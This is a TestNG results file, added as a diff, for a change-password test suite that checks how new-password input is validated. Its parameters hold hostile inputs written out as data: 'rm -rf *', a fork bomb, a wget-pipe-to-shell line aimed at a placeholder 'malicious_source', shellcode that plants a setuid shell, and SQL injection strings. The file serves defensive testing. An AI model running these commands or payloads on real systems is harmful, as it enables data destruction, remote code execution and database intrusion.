@@ -1,0 +1,1040 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<testng-results skipped="0" failed="0" ignored="0" total="84" passed="84">
+  <reporter-output>
+  </reporter-output>
+  <suite name="N11 Test Suite" duration-ms="354" started-at="2020-02-23T12:55:51 IST" finished-at="2020-02-23T12:55:51 IST">
+    <groups>
+    </groups>
+    <test name="Change Password Test" duration-ms="354" started-at="2020-02-23T12:55:51 IST" finished-at="2020-02-23T12:55:51 IST">
+      <class name="tests.ChangePasswordTest">
+        <test-method status="PASS" signature="doBeforeTest()[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="doBeforeTest" is-config="true" duration-ms="12" started-at="2020-02-23T12:55:51 IST" finished-at="2020-02-23T12:55:51 IST">
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- doBeforeTest -->
+        <test-method status="PASS" signature="setLogger()[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="setLogger" is-config="true" duration-ms="1" started-at="2020-02-23T12:55:51 IST" finished-at="2020-02-23T12:55:51 IST">
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- setLogger -->
+        <test-method status="PASS" signature="CrossSiteScriptingAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="CrossSiteScriptingAsNewPassword" duration-ms="78" started-at="2020-02-23T12:55:51 IST" description="New password contains cross site scripting commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.CrossSiteScriptingAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[rm -rf *]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- CrossSiteScriptingAsNewPassword -->
+        <test-method status="PASS" signature="CrossSiteScriptingAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="CrossSiteScriptingAsNewPassword" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password contains cross site scripting commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.CrossSiteScriptingAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[: () {: |: &} ;:]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- CrossSiteScriptingAsNewPassword -->
+        <test-method status="PASS" signature="CrossSiteScriptingAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="CrossSiteScriptingAsNewPassword" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password contains cross site scripting commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.CrossSiteScriptingAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[command> / dev / sda#]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- CrossSiteScriptingAsNewPassword -->
+        <test-method status="PASS" signature="CrossSiteScriptingAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="CrossSiteScriptingAsNewPassword" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password contains cross site scripting commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.CrossSiteScriptingAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[mv directory / dev / null]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- CrossSiteScriptingAsNewPassword -->
+        <test-method status="PASS" signature="CrossSiteScriptingAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="CrossSiteScriptingAsNewPassword" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password contains cross site scripting commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.CrossSiteScriptingAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[wget http: // malicious_source -O | sh]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- CrossSiteScriptingAsNewPassword -->
+        <test-method status="PASS" signature="CrossSiteScriptingAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="CrossSiteScriptingAsNewPassword" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password contains cross site scripting commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.CrossSiteScriptingAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[char esp[] __attribute__ ((section(\u201C.text\u201D))) \/* e.s.p release *\/ = \u201C\\xeb\\x3e\\x5b\\x31\\xc0\\x50\\x54\\x5a\\x83\\xec\\x64\\x68\u2033 \u201C\\xff\\xff\\xff\\xff\\x68\\xdf\\xd0\\xdf\\xd9\\x68\\x8d\\x99\u2033 \u201C\\xdf\\x81\\x68\\x8d\\x92\\xdf\\xd2\\x54\\x5e\\xf7\\x16\\xf7\u2033 \u201C\\x56\\x04\\xf7\\x56\\x08\\xf7\\x56\\x0c\\x83\\xc4\\x74\\x56\u2033 \u201C\\x8d\\x73\\x08\\x56\\x53\\x54\\x59\\xb0\\x0b\\xcd\\x80\\x31\u2033 \u201C\\xc0\\x40\\xeb\\xf9\\xe8\\xbd\\xff\\xff\\xff\\x2f\\x62\\x69\u2033 \u201C\\x6e\\x2f\\x73\\x68\\x00\\x2d\\x63\\x00\u2033 \u201Ccp -p \/bin\/sh \/tmp\/.beyond; chmod 4755 \/tmp\/.beyond;\u201D;#]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- CrossSiteScriptingAsNewPassword -->
+        <test-method status="PASS" signature="DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="DangerousLinuxCommandsAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password contains dangerous Linux commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[rm -rf *]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- DangerousLinuxCommandsAsNewPassword -->
+        <test-method status="PASS" signature="DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="DangerousLinuxCommandsAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password contains dangerous Linux commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[: () {: |: &} ;:]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- DangerousLinuxCommandsAsNewPassword -->
+        <test-method status="PASS" signature="DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="DangerousLinuxCommandsAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password contains dangerous Linux commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[command> / dev / sda#]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- DangerousLinuxCommandsAsNewPassword -->
+        <test-method status="PASS" signature="DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="DangerousLinuxCommandsAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password contains dangerous Linux commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[mv directory / dev / null]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- DangerousLinuxCommandsAsNewPassword -->
+        <test-method status="PASS" signature="DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="DangerousLinuxCommandsAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password contains dangerous Linux commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[wget http: // malicious_source -O | sh]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- DangerousLinuxCommandsAsNewPassword -->
+        <test-method status="PASS" signature="DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="DangerousLinuxCommandsAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password contains dangerous Linux commands" data-provider="DangerousLinuxCommands" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.DangerousLinuxCommandsAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[char esp[] __attribute__ ((section(\u201C.text\u201D))) \/* e.s.p release *\/ = \u201C\\xeb\\x3e\\x5b\\x31\\xc0\\x50\\x54\\x5a\\x83\\xec\\x64\\x68\u2033 \u201C\\xff\\xff\\xff\\xff\\x68\\xdf\\xd0\\xdf\\xd9\\x68\\x8d\\x99\u2033 \u201C\\xdf\\x81\\x68\\x8d\\x92\\xdf\\xd2\\x54\\x5e\\xf7\\x16\\xf7\u2033 \u201C\\x56\\x04\\xf7\\x56\\x08\\xf7\\x56\\x0c\\x83\\xc4\\x74\\x56\u2033 \u201C\\x8d\\x73\\x08\\x56\\x53\\x54\\x59\\xb0\\x0b\\xcd\\x80\\x31\u2033 \u201C\\xc0\\x40\\xeb\\xf9\\xe8\\xbd\\xff\\xff\\xff\\x2f\\x62\\x69\u2033 \u201C\\x6e\\x2f\\x73\\x68\\x00\\x2d\\x63\\x00\u2033 \u201Ccp -p \/bin\/sh \/tmp\/.beyond; chmod 4755 \/tmp\/.beyond;\u201D;#]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- DangerousLinuxCommandsAsNewPassword -->
+        <test-method status="PASS" signature="SQLInjectionAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="SQLInjectionAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="SQL injection Commands as new password" data-provider="sqlInjectionData" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.SQLInjectionAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[' or 1=1--]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- SQLInjectionAsNewPassword -->
+        <test-method status="PASS" signature="SQLInjectionAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="SQLInjectionAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="SQL injection Commands as new password" data-provider="sqlInjectionData" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.SQLInjectionAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[" or 1=1--]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- SQLInjectionAsNewPassword -->
+        <test-method status="PASS" signature="SQLInjectionAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="SQLInjectionAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="SQL injection Commands as new password" data-provider="sqlInjectionData" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.SQLInjectionAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[or 1=1--]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- SQLInjectionAsNewPassword -->
+        <test-method status="PASS" signature="SQLInjectionAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="SQLInjectionAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="SQL injection Commands as new password" data-provider="sqlInjectionData" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.SQLInjectionAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[' or 'a'='a]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- SQLInjectionAsNewPassword -->
+        <test-method status="PASS" signature="SQLInjectionAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="SQLInjectionAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="SQL injection Commands as new password" data-provider="sqlInjectionData" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.SQLInjectionAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[" or "a"="a]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- SQLInjectionAsNewPassword -->
+        <test-method status="PASS" signature="SQLInjectionAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="SQLInjectionAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="SQL injection Commands as new password" data-provider="sqlInjectionData" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.SQLInjectionAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[') or ('a'='a]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- SQLInjectionAsNewPassword -->
+        <test-method status="PASS" signature="SQLInjectionAsNewPassword(java.lang.reflect.Method, java.lang.String)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="SQLInjectionAsNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="SQL injection Commands as new password" data-provider="sqlInjectionData" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.SQLInjectionAsNewPassword(java.lang.reflect.Method,java.lang.String)]]>
+              </value>
+            </param>
+            <param index="1">
+              <value>
+                <![CDATA[") or ("a"="a]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- SQLInjectionAsNewPassword -->
+        <test-method status="PASS" signature="blankNewPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="blankNewPassword" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="blank new password" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.blankNewPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- blankNewPassword -->
+        <test-method status="PASS" signature="escapeSequenceInBetweenNewPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="escapeSequenceInBetweenNewPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="Escape sequence in between new password" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.escapeSequenceInBetweenNewPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- escapeSequenceInBetweenNewPassword -->
+        <test-method status="PASS" signature="leadingSpacesInNewPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="leadingSpacesInNewPassword" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="Leading spaces in new password" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.leadingSpacesInNewPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- leadingSpacesInNewPassword -->
+        <test-method status="PASS" signature="newPassword100PercentMatchWithOldPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPassword100PercentMatchWithOldPassword" duration-ms="3" started-at="2020-02-23T12:55:51 IST" description="New password and old password 100% match" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPassword100PercentMatchWithOldPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPassword100PercentMatchWithOldPassword -->
+        <test-method status="PASS" signature="newPassword80PercentMatchWithOldPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPassword80PercentMatchWithOldPassword" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password and old password 80% match" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPassword80PercentMatchWithOldPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPassword80PercentMatchWithOldPassword -->
+        <test-method status="PASS" signature="newPassword85PercentMatchWithOldPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPassword85PercentMatchWithOldPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password and old password 85% match" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPassword85PercentMatchWithOldPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPassword85PercentMatchWithOldPassword -->
+        <test-method status="PASS" signature="newPassword90PercentMatchWithOldPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPassword90PercentMatchWithOldPassword" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password and old password 90% match" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPassword90PercentMatchWithOldPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPassword90PercentMatchWithOldPassword -->
+        <test-method status="PASS" signature="newPassword95PercentMatchWithOldPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPassword95PercentMatchWithOldPassword" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password and old password 95% match" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPassword95PercentMatchWithOldPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPassword95PercentMatchWithOldPassword -->
+        <test-method status="PASS" signature="newPasswordEqualTo18(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordEqualTo18" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password with =18 characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordEqualTo18(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordEqualTo18 -->
+        <test-method status="PASS" signature="newPasswordGreaterThan18(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordGreaterThan18" duration-ms="3" started-at="2020-02-23T12:55:51 IST" description="New password with &gt;18 characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordGreaterThan18(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordGreaterThan18 -->
+        <test-method status="PASS" signature="newPasswordHasEmojiCharacter(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordHasEmojiCharacter" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password has emoji characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordHasEmojiCharacter(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordHasEmojiCharacter -->
+        <test-method status="PASS" signature="newPasswordHasRegex1(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordHasRegex1" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password has Regex (The value must be between 0.10 and 0.90)" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordHasRegex1(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordHasRegex1 -->
+        <test-method status="PASS" signature="newPasswordHasRegex2(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordHasRegex2" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password has Regex (the value must be in 3 and 4, taking into account decimals.)" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordHasRegex2(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordHasRegex2 -->
+        <test-method status="PASS" signature="newPasswordHasRegexOfTestCondition1(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordHasRegexOfTestCondition1" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password has Regex of our test condition 1" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordHasRegexOfTestCondition1(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordHasRegexOfTestCondition1 -->
+        <test-method status="PASS" signature="newPasswordHasUnicodeCharacter(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordHasUnicodeCharacter" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password has unicode characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordHasUnicodeCharacter(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordHasUnicodeCharacter -->
+        <test-method status="PASS" signature="newPasswordHasUnusualCharacter(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordHasUnusualCharacter" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password has unusual character ♔" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordHasUnusualCharacter(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordHasUnusualCharacter -->
+        <test-method status="PASS" signature="newPasswordLessPalindromeOfOldPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordLessPalindromeOfOldPassword" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password palindrome of old password" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordLessPalindromeOfOldPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordLessPalindromeOfOldPassword -->
+        <test-method status="PASS" signature="newPasswordLessThan18(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordLessThan18" duration-ms="1" started-at="2020-02-23T12:55:51 IST" description="New password with &lt;18 characters" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordLessThan18(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordLessThan18 -->
+        <test-method status="PASS" signature="newPasswordLessThan80PercentMatchWithOldPassword(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordLessThan80PercentMatchWithOldPassword" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="New password and old password &lt;80% match" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordLessThan80PercentMatchWithOldPassword(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordLessThan80PercentMatchWithOldPassword -->
+        <test-method status="PASS" signature="newPasswordSameAsOldPasswordWithUpperChangeToLowerAndSimilar(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="newPasswordSameAsOldPasswordWithUpperChangeToLowerAndSimilar" duration-ms="3" started-at="2020-02-23T12:55:51 IST" description="New password same as Old password but all upper change to lower change and vice versa" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.newPasswordSameAsOldPasswordWithUpperChangeToLowerAndSimilar(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- newPasswordSameAsOldPasswordWithUpperChangeToLowerAndSimilar -->
